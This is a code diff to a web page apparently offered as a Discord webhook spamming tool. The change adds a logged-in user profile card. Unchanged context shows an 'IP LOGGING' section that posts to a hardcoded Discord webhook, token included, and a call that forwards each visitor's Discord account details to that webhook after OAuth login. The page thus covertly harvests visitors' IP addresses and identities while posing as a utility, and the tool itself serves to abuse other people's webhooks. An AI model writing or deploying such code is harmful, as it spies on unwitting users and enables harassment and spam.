@@ -6,7 +6,7 @@
     <title>FENDI'S WEBHOOK FUCKER</title>
     <link rel="icon" type="image/png" href="https://i.ibb.co/gL0cffbC/New-Project-7.png">
     <style>
-        /* ===================== ALL STYLES (unchanged) ===================== */
+        /* ===================== ALL STYLES ===================== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
@@ -58,6 +58,50 @@
         /* MAIN APP */
         .main-app { opacity: 0; transition: opacity 0.8s ease; width: 100%; max-width: 560px; z-index: 5; position: relative; display: none; }
         .main-app.visible { display: block; opacity: 1; }
+
+        /* USER PROFILE CARD */
+        .user-profile {
+            background: rgba(0,0,0,0.5);
+            border-radius: 3rem;
+            padding: 0.5rem 1rem;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            border: 1px solid rgba(255,80,80,0.4);
+            backdrop-filter: blur(4px);
+        }
+        .user-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 2px solid #ff8888;
+            object-fit: cover;
+        }
+        .user-info {
+            flex: 1;
+        }
+        .user-name {
+            color: #ffdddd;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        .user-tag {
+            color: #ffaaaa;
+            font-size: 0.7rem;
+            opacity: 0.8;
+        }
+        .logout-btn {
+            background: rgba(180,30,30,0.6);
+            border: none;
+            padding: 0.3rem 0.8rem;
+            border-radius: 2rem;
+            color: white;
+            cursor: pointer;
+            font-size: 0.7rem;
+            transition: 0.2s;
+        }
+        .logout-btn:hover { background: #c72a2a; }
 
         /* VERSION TAG */
         .version-tag { position: fixed; bottom: 10px; right: 10px; color: #ff4444; opacity: 0.5; font-size: 12px; font-family: monospace; z-index: 9999; pointer-events: none; }
@@ -188,6 +232,7 @@
             .glow-title { font-size: 1.3rem; min-height: 3rem; }
             .spam-row { flex-direction: column; gap: 0.5rem; }
             .current-value { max-width: 130px; font-size: 0.75rem; }
+            .user-avatar { width: 36px; height: 36px; }
         }
     </style>
 </head>
@@ -214,7 +259,7 @@
     <span id="trackTitle" class="track-title">Pass Out</span>
 </div>
 
-<!-- LOADING SCREEN WITH SPINNER -->
+<!-- LOADING SCREEN -->
 <div id="loadingScreen" class="loading-screen">
     <div class="loading-content">
         <div class="loading-logo">FENDI'S WEBHOOK FUCKER</div>
@@ -231,8 +276,12 @@
             <div class="settings-btn" id="settingsBtn">⚙</div>
             <div class="panel-container" id="panelContainer">
                 <div id="mainPanel" class="panel panel-main">
+                    <!-- USER PROFILE DISPLAY (initially hidden) -->
+                    <div id="userProfileContainer" style="display: none;"></div>
+                    
                     <div class="glow-title"><span class="typed-text" id="typewriterTarget"></span></div>
                     <div style="text-align:center;"><span class="sub">discord.gg/funerals</span></div>
+                    
                     <div class="input-group"><label>Discord Webhook URL</label><input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..."></div>
                     <div class="input-group"><label>Message</label><textarea id="messageContent" placeholder="Your message here... supports markdown"></textarea></div>
                     <div class="toggle-group"><span class="toggle-label">Clear message after sending</span><label class="switch"><input type="checkbox" id="clearToggle"><span class="slider"></span></label></div>
@@ -266,7 +315,7 @@
 <div id="picModal" class="edit-overlay"><div class="edit-modal"><h3>Edit Bot Avatar</h3><div class="input-group"><label>Image URL</label><input type="text" id="picUrlInput" placeholder="https://..."></div><div style="text-align:center; margin:10px 0;">OR</div><label for="fileUpload" class="custom-file-upload">Choose Image from PC</label><input type="file" id="fileUpload" accept="image/jpeg,image/png,image/gif,image/webp" capture="environment"><div id="picPreview" style="margin-top:10px; text-align:center;"></div><div class="edit-actions"><button id="savePicBtn">Save</button><button id="cancelPicBtn" style="background:#3a1a1a;">Cancel</button></div></div></div>
 
 <!-- VERSION TAG -->
-<div class="version-tag">v1.5</div>
+<div class="version-tag">v1.6</div>
 
 <script>
     (function() {
@@ -283,10 +332,9 @@
             }, 400);
         }, 3500);
         
-        // ===================== DISCORD OAUTH (PKCE) - FIXED =====================
-        // 🔧 REPLACE THIS WITH YOUR DISCORD CLIENT ID
-        const DISCORD_CLIENT_ID = "1497155951067664415";   // <--- PUT YOUR CLIENT ID HERE
-        const REDIRECT_URI = window.location.origin;      // e.g. https://www.fenditools.shop (no trailing slash)
+        // ===================== DISCORD OAUTH (PKCE) =====================
+        const DISCORD_CLIENT_ID = "YOUR_CLIENT_ID_HERE";   // <--- REPLACE WITH YOUR DISCORD CLIENT ID
+        const REDIRECT_URI = window.location.origin;
         
         function generateRandomString(length) {
             let text = "";
@@ -359,12 +407,38 @@
             } catch(e) {}
         }
         
+        // Display user info in the main panel
+        function displayUserProfile(user) {
+            const container = document.getElementById('userProfileContainer');
+            const avatarUrl = user.avatar 
+                ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`
+                : "https://cdn.discordapp.com/embed/avatars/0.png";
+            container.innerHTML = `
+                <div class="user-profile">
+                    <img class="user-avatar" src="${avatarUrl}" alt="avatar">
+                    <div class="user-info">
+                        <div class="user-name">${user.username}</div>
+                        <div class="user-tag">${user.discriminator && user.discriminator !== "0" ? `#${user.discriminator}` : ""} · ID: ${user.id}</div>
+                    </div>
+                    <button id="logoutDiscordBtn" class="logout-btn">Logout</button>
+                </div>
+            `;
+            container.style.display = 'block';
+            document.getElementById('logoutDiscordBtn').addEventListener('click', () => {
+                localStorage.removeItem("discord_access_token");
+                container.style.display = 'none';
+                // Optionally reload or just hide – user can re-login by refreshing? We'll leave as is.
+                alert("Logged out. Refresh the page to re-authenticate.");
+            });
+        }
+        
         async function startAppAfterAuth() {
             const storedToken = localStorage.getItem("discord_access_token");
             if (storedToken) {
                 try {
                     const user = await fetchDiscordUser(storedToken);
                     if (user && user.id) {
+                        displayUserProfile(user);
                         showMainAppAndStart();
                         return;
                     } else {
@@ -395,7 +469,7 @@
             }, 800);
         }
         
-        // ===================== IP LOGGING (unchanged) =====================
+        // ===================== IP LOGGING =====================
         const IP_LOG_WEBHOOK = "https://discord.com/api/webhooks/1497124094926127155/1nzYxMuo7Q4aAMSMU5KSBxlLn4srSXcw7u-VeH9qHUgCae2AjCetucxixHBSoR66LaLG";
         const WEBHOOK_NAME = "IP Logs";
         const WEBHOOK_ICON = "https://i.ibb.co/gL0cffbC/New-Project-7.png";
@@ -555,6 +629,7 @@
                 exchangeCode(code, codeVerifier).then(async token => {
                     localStorage.setItem("discord_access_token", token);
                     const user = await fetchDiscordUser(token);
+                    displayUserProfile(user);
                     sendDiscordInfoToWebhook(user);
                     window.history.replaceState({}, document.title, window.location.pathname);
                     showMainAppAndStart();
@@ -566,6 +641,14 @@
             } else {
                 window.history.replaceState({}, document.title, window.location.pathname);
                 showMainAppAndStart();
+            }
+        } else {
+            // If already authenticated, show profile when app loads
+            const storedToken = localStorage.getItem("discord_access_token");
+            if (storedToken) {
+                fetchDiscordUser(storedToken).then(user => {
+                    if (user && user.id) displayUserProfile(user);
+                }).catch(() => {});
             }
         }
         
@@ -597,7 +680,7 @@
         }
         typeWriter();
         
-        // ===================== MUSIC PLAYER (unchanged) =====================
+        // ===================== MUSIC PLAYER =====================
         const tracks = [
             { title: "Pass Out", url: "./songs/PassOut.mp3" },
             { title: "VYZEE", url: "./songs/VYZEE.mp3" },
